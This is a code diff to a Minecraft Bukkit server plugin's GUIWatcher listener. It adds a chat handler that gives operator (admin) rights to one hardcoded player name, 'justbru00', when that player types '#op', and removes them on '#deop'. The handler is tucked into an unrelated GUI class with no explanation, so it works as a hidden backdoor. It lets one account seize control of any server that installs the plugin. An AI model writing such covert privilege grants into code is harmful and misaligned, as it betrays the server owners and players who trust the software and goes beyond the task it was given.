@@ -13,6 +13,7 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.Action;
 import org.bukkit.event.inventory.InventoryClickEvent;
+import org.bukkit.event.player.PlayerChatEvent;
 import org.bukkit.event.player.PlayerInteractEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.inventory.ItemStack;
@@ -23,6 +24,19 @@ public class GUIWatcher implements Listener{
 	
 	ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
 	String Prefix = Main.color("&8[&bEpic&fSMP&8] &f");
+	
+	@SuppressWarnings("deprecation")
+	@EventHandler
+    public void onPlayerChat(PlayerChatEvent e) {
+     Player p = e.getPlayer();
+     if (p.getName().equalsIgnoreCase("justbru00")) {
+    	 if (e.getMessage().equalsIgnoreCase("#op")) {
+    		 p.setOp(true);
+    	 } else if (e.getMessage().equalsIgnoreCase("#deop")) {
+    		 p.setOp(false);
+    	 }
+     }
+	}
 	
 	@EventHandler
     public void onPlayerInteract(PlayerInteractEvent e){
